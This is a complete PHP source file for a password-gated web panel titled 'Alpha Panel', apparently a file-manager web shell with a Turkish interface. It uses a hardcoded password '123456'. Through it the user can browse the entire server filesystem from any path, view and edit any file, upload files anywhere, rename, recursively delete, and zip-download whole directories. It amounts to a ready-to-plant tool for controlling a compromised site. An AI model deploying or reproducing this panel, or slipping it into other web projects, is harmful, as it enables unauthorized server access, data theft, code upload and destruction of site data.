<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(0);
ini_set('memory_limit', '1024M');
session_start();

/* ========= AYAR ========= */
$PASSWORD = '123456';
/* ======================= */

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

/* ========= LOGIN ========= */
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
        $_SESSION['auth'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    }
    ?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Alpha Panel Login</title>
<style>
body{background:#1e1f24;color:#e6e6e6;font-family:system-ui}
.login{width:320px;margin:140px auto;background:#2a2c33;padding:20px;border-radius:8px}
input,button{width:100%;padding:10px;margin-top:10px;background:#1a1b20;border:1px solid #3a3d46;color:#fff;border-radius:4px}
button{background:#4ea1ff;border:none;cursor:pointer}
</style>
</head>
<body>
<div class="login">
<h3>Alpha Panel</h3>
<form method="post">
<input type="password" name="pass" placeholder="Şifre">
<button>Giriş</button>
</form>
</div>
</body>
</html>
<?php exit; }

/* ========= SEKME ========= */
$tab = $_GET['tab'] ?? 'files';

/* ================= FILE MANAGER ================= */

$path = isset($_GET['path']) ? realpath($_GET['path']) : realpath(getcwd());
if (!$path) $path = DIRECTORY_SEPARATOR;

/* ---------- recursive delete ---------- */
function rrmdir($src) {
    if (is_file($src) || is_link($src)) return @unlink($src);
    if (!is_dir($src)) return false;
    foreach (scandir($src) as $i) {
        if ($i === '.' || $i === '..') continue;
        rrmdir($src.DIRECTORY_SEPARATOR.$i);
    }
    return @rmdir($src);
}

/* ---------- tek zip ---------- */
function zip_it($src, $zipname) {
    $zip = new ZipArchive();
    $zip->open($zipname, ZipArchive::CREATE);
    if (is_dir($src)) {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($it as $f) {
            $fp = $f->getRealPath();
            $local = substr($fp, strlen($src) + 1);
            $f->isDir() ? $zip->addEmptyDir($local) : $zip->addFile($fp, $local);
        }
    } else {
        $zip->addFile($src, basename($src));
    }
    $zip->close();
}

/* ---------- SEÇİLİ ZIP ---------- */
function zip_selected(array $items, string $zipName) {
    $zip = new ZipArchive();
    $zip->open($zipName, ZipArchive::CREATE);

    foreach ($items as $item) {
        $real = realpath($item);
        if (!$real) continue;

        if (is_dir($real)) {
            $base = dirname($real);
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($real, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($it as $f) {
                $fp = $f->getRealPath();
                $local = substr($fp, strlen($base) + 1);
                $f->isDir() ? $zip->addEmptyDir($local) : $zip->addFile($fp, $local);
            }
        } else {
            $zip->addFile($real, basename($real));
        }
    }
    $zip->close();
}

/* ---------- ZIP (tek) ---------- */
if ($tab === 'files' && isset($_GET['zip'])) {
    $target = realpath($_GET['zip']);
    if (!$target) die("Hedef yok");
    $zipName = basename($target)."_".date("Ymd_His").".zip";
    zip_it($target, $zipName);
    header("Content-Type: application/zip");
    header("Content-Disposition: attachment; filename=$zipName");
    header("Content-Length: ".filesize($zipName));
    readfile($zipName);
    unlink($zipName);
    exit;
}

/* ---------- TOPLU ZIP ---------- */
if ($tab === 'files' && isset($_POST['bulk_zip'])) {
    if (!empty($_POST['items'])) {
        $zipName = "selected_".date("Ymd_His").".zip";
        zip_selected($_POST['items'], $zipName);
        header("Content-Type: application/zip");
        header("Content-Disposition: attachment; filename=$zipName");
        header("Content-Length: ".filesize($zipName));
        readfile($zipName);
        unlink($zipName);
        exit;
    }
}

/* ---------- VIEW ---------- */
if ($tab === 'files' && isset($_GET['view'])) {
    $f = realpath($_GET['view']);
    if (!$f || !is_file($f)) die("Dosya yok");
    echo "<pre style='background:#1a1b20;color:#e6e6e6;padding:15px;border-radius:6px'>".
         htmlspecialchars(file_get_contents($f)).
         "</pre>";
    exit;
}

/* ---------- EDIT ---------- */
if ($tab === 'files' && isset($_GET['edit'])) {
    $f = realpath($_GET['edit']);
    if (!$f || !is_file($f)) die("Dosya yok");
    if (isset($_POST['save'])) {
        file_put_contents($f, $_POST['content']);
        header("Location: ?tab=files&path=".urlencode(dirname($f)));
        exit;
    }
    ?>
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Edit</title></head>
<body style="background:#1e1f24;color:#e6e6e6">
<form method="post">
<textarea name="content" style="width:100%;height:90vh;background:#1a1b20;color:#e6e6e6"><?=htmlspecialchars(file_get_contents($f))?></textarea>
<button name="save">Kaydet</button>
</form>
</body>
</html>
<?php exit; }

/* ---------- RENAME ---------- */
if ($tab === 'files' && isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = realpath($_POST['rename_from']);
    $to = dirname($from).DIRECTORY_SEPARATOR.$_POST['rename_to'];
    if ($from && !file_exists($to)) rename($from, $to);
    header("Location: ?tab=files&path=".urlencode(dirname($from)));
    exit;
}

/* ---------- UPLOAD ---------- */
if ($tab === 'files' && !empty($_FILES['files'])) {
    foreach ($_FILES['files']['tmp_name'] as $i => $tmp) {
        if ($tmp) move_uploaded_file($tmp, $path.DIRECTORY_SEPARATOR.$_FILES['files']['name'][$i]);
    }
    header("Location: ?tab=files&path=".urlencode($path));
    exit;
}

/* ---------- TEK SİL ---------- */
if ($tab === 'files' && isset($_GET['delete'])) {
    $t = realpath($_GET['delete']);
    if ($t) rrmdir($t);
    header("Location: ?tab=files&path=".urlencode(dirname($t)));
    exit;
}

/* ---------- TOPLU SİL ---------- */
if ($tab === 'files' && isset($_POST['bulk_delete'])) {
    if (!empty($_POST['items'])) {
        foreach ($_POST['items'] as $i) {
            $t = realpath($i);
            if ($t) rrmdir($t);
        }
    }
    header("Location: ?tab=files&path=".urlencode($path));
    exit;
}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Alpha Panel</title>
<style>
body{background:#1e1f24;color:#e6e6e6;font-family:system-ui}
a{color:#4ea1ff;text-decoration:none}
table{width:100%;border-collapse:collapse}
td{padding:8px;border-bottom:1px solid #3a3d46}
tr:nth-child(even){background:#24262d}
button{background:#4ea1ff;border:none;color:#fff;padding:6px 12px;border-radius:4px;cursor:pointer}
</style>
</head>
<body>

<h2>Alpha Panel</h2>
<a href="?tab=files">📂 Files</a> |
<a href="?logout=1" style="color:#ff5c5c">Çıkış</a>
<hr>

<b>Dizin:</b> <?=htmlspecialchars($path)?><br><br>

<form method="post" enctype="multipart/form-data">
<input type="file" name="files[]" multiple>
<button>Upload</button>
</form>

<form method="post" onsubmit="return confirm('Seçilen işlem yapılsın mı?')">
<table>
<?php foreach (@scandir($path) as $i):
if ($i==='.') continue;
$full=$path.DIRECTORY_SEPARATOR.$i; ?>
<tr>
<td width="20"><input type="checkbox" name="items[]" value="<?=htmlspecialchars($full)?>"></td>
<td>
<?= is_dir($full)
? "📁 <a href='?tab=files&path=".urlencode($full)."'>".htmlspecialchars($i)."</a>"
: "📄 ".htmlspecialchars($i) ?>
</td>
<td width="280">
<a href="?tab=files&zip=<?=urlencode($full)?>">ZIP</a>
<?php if (is_file($full)): ?>
 | <a href="?tab=files&view=<?=urlencode($full)?>">GÖR</a>
 | <a href="?tab=files&edit=<?=urlencode($full)?>">EDİT</a>
<?php endif; ?>
 | <a href="?tab=files&delete=<?=urlencode($full)?>" onclick="return confirm('Silinsin mi?')" style="color:#ff5c5c">SİL</a>
</td>
</tr>
<?php endforeach; ?>
</table>
<br>
<button name="bulk_delete" style="background:#e74c3c">Seçilenleri Sil</button>
<button name="bulk_zip" style="background:#2ecc71;margin-left:10px">Seçilenleri ZIP’le</button>
</form>

</body>
</html>
